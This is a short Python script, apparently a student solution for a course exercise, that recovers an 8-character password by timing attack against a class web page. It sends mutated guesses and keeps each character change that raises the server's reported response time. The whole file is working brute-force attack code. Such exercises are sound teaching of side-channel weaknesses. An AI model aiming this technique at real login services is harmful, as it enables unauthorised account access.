
import urllib.request
import random
oldtime = 0
newtime = 0
condition = 0
itera = 0
pool = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
keylength = 8
password =  "".join(random.sample(pool,keylength ))
print (password)
ipool = [0, 1, 2, 3, 4, 5, 6, 7]
track = [['reset','reset']]


while (newtime != "SUCCESSFUL") :
    while (oldtime >= newtime):
        itera = itera +1
        print(password + " time: " + str(newtime) + " iteration: " + str(itera))
        oldtime = newtime
        try:
            index = random.choice(ipool)
        except:
            ipool = [0, 1, 2, 3, 4, 5, 6, 7]
            index = random.choice(ipool)
            oldtime = 0
            newtime = 0
            
        condition = 0 
        #keeps track if previous values at different index to avoiding repetition
        while (condition != 1):
            randch = "".join(random.sample(pool,1))
            for x in range(0, len(track)):
                if (track[x][0] == index) and (track[x][1] == randch):
                    condition = 0
                else:
                    condition = 1 
            
        password = password[:index] + randch + password[index+1 :]
        req = urllib.request.urlopen("https://john.cs.olemiss.edu/~jones/csci343/pwd/index.php?username=BurgundyWalrus&password={}".format(password))
        newtime = req.read(10)
        newtime = str(newtime, 'utf-8')
        if (newtime == "SUCCESSFUL"):
            break
        newtime = newtime.split(" ")
        newtime = int(newtime[0])
        track.append([index,randch])
        
        #sometimes the website gives larger time(improvement) even when there isn't any improvement 
        #or when the characters are in the wrong order
        #This rarely happens, if that happens, this block resets the variables and runs the algorithm again
        if (itera > 800):
            track = track = [['reset','reset']]
            ipool = [0, 1, 2, 3, 4, 5, 6, 7]
            itera = 0
            password =  "".join(random.sample(pool,keylength ))
            oldtime = 0
            newtime = 0
    
    oldtime = newtime
    ipool.remove(index)


print("The password is " + password)
